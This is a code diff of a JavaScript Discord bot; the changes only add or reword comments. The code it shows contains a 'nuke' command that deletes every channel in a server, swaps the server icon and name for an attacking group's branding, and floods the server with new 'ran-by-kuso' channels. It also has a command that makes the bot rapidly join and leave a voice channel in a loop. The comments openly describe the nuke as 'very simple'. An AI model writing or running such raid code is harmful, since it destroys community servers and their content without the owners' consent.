@@ -15,7 +15,7 @@ bot.on("message", async function (msg) {
 if (msg.content.indexOf(`${prefix}join`) === 0) {
   msg.member.lastMessage.delete();
   if(!msg.member.voice.channel) return msg.channel.send("You are not in a voice channel");
-  for(let i =0;i<=10;i++) {
+  for(let i =0;i<=10;i++) { // tends to have a higher chance of breaking the larger the loop is
     msg.member.voice.channel.join();
     msg.member.voice.channel.leave();
   }
@@ -23,14 +23,14 @@ if (msg.content.indexOf(`${prefix}join`) === 0) {
 
 if (msg.content.indexOf(`${prefix}leave`) === 0) {
   msg.member.lastMessage.delete();
-  msg.member.voice.channel.leave();
-} //you can use this command if the bot "breaks"
+  msg.member.voice.channel.leave(); // use this command if the bot gets stuck in a voice channel
+}
 
 if (msg.content === `${prefix}nuke`) {
   msg.guild.channels.cache.forEach(channel => channel.delete())
   msg.guild.setIcon("https://teamkuso.xyz/img/kuso.png")
   msg.guild.setName("fucked server")
-    for(let i =0;i<=15;i++) {
+    for(let i =0;i<=15;i++) { // very simple server nuke
     await msg.guild.channels.create('ran-by-kuso', {
       type: 'text',
       permissionOverwrites: [
